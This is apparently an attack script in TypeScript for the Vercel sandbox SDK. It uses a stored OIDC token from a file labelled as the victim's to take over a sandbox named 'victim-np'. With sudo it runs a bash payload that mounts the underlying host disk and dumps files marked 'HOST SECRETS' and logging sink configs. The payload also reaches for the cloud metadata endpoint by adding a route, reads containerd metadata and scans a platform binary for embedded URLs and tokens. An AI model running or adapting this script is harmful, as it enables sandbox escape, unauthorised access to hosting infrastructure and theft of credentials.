import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "===== /etc/default/vector (HOST SECRETS) ====="
cat $R/etc/default/vector 2>&1
ls -la $R/etc/default/ 2>&1
echo
echo "===== vector sinks ====="
for f in $R/etc/vector/sinks/*.toml; do echo "--- $f ---"; cat "$f" 2>&1; done
echo "--- sources ---"
for f in $R/etc/vector/sources/*.toml; do echo "--- $f ---"; cat "$f" 2>&1; done
echo "--- vector.toml ---"; cat $R/etc/vector/vector.toml 2>&1
echo
echo "===== MMDS test from this netns ====="
ip route 2>&1
ip route get 169.254.169.254 2>&1
curl -s -m 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-metadata-token-ttl-seconds: 60" 2>&1 | head -c 200; echo
echo "--- try add route to mmds ---"
sudo ip route add 169.254.169.254/32 dev eth0 2>&1
curl -s -m 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-metadata-token-ttl-seconds: 60" 2>&1 | head -c 200; echo
echo
echo "===== containerd metadata (bolt db) ====="
ls -la $R/var/lib/containerd/io.containerd.metadata.v1.bolt/ 2>&1
strings $R/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db 2>/dev/null | grep -iE "docker.io|ghcr|registry|image|snapshot|content|sha256|config" | head -40
echo
echo "===== host cmdline / proc (cell boot info) ====="
cat $R/proc/cmdline 2>&1
echo "--- dmi/ec2 metadata refs ---"
find $R/etc -maxdepth 2 -name "*cloud*" 2>&1 | head
echo
echo "===== celld env vars embedded? (strings scan for URLs/tokens) ====="
strings -n 8 $R/opt/vercel/celld 2>/dev/null | grep -aE "https?://|wss?://" | grep -vE "schema|w3\.org|golang|google|github\.com/|example|\.well-known|k8s\.io|opencontainers|grpc\.io|apis\.cncf|in-addr" | sort -u | head -40
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore4.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore4.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });